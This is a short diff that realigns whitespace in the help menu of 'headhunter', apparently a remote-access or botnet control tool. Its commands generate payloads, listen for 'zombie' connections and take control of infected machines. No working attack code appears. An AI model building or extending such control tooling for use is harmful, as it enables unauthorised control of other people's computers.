@@ -56,9 +56,9 @@ while True:
 			                       Commands
 ------------------------------------------------------------------------------------------------------
 help                      --          displays this menu
-generate		          --          create a payload which is saved in the output folder
+generate		  --          create a payload which is saved in the output folder
 listen <LPORT>            --	      starts listening for zombies on the specified local port
-show connections	      -- 	      displays active zombie connections by address and source port
+show connections	  -- 	      displays active zombie connections by address and source port
 control <session>         --          controls an infected zombie by session number
 exit                      --          exits the headhunter interactive shell
 		''')
